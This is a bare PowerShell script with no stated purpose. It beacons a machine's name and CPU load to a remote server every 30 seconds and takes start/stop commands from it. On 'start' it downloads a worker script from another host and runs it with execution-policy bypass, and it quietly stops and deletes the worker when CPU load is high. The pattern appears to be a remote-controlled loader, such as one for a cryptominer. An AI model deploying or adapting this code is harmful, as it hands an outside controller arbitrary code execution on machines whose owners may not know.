$SERVER = "https://your-project.vercel.app"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $null
$CPU_LIMIT = 70

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Send-Status($running,$cpu){

    $body = @{
        id = $SYSTEM
        running = $running
        cpu = [int]$cpu
        vpn = $true
    } | ConvertTo-Json

    Invoke-RestMethod `
        -Uri "$SERVER/api/status" `
        -Method POST `
        -Body $body `
        -ContentType "application/json" `
        -TimeoutSec 10 | Out-Null
}

function Get-Command {
    try {
        (Invoke-RestMethod "$SERVER/api/command?id=$SYSTEM").command
    } catch {
        "stop"
    }
}

function Start-Worker {

    if ($WORKER) { return }

    if (!(Test-Path $TEMP_DIR)) {
        New-Item -ItemType Directory $TEMP_DIR | Out-Null
    }

    Invoke-WebRequest `
        -Uri "https://server/worker.ps1" `
        -OutFile "$TEMP_DIR\worker.ps1"

    $global:WORKER = Start-Process powershell `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$TEMP_DIR\worker.ps1`"" `
        -PassThru
}

function Stop-Worker {

    if ($WORKER) {
        Stop-Process -Id $WORKER.Id -Force
        $global:WORKER = $null
    }

    if (Test-Path $TEMP_DIR) {
        Remove-Item $TEMP_DIR -Recurse -Force
    }
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command

    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Start-Worker }
    if($cmd -eq "stop"){ Stop-Worker }

    $running = $WORKER -ne $null
    Send-Status $running $cpu

    Start-Sleep 30
}
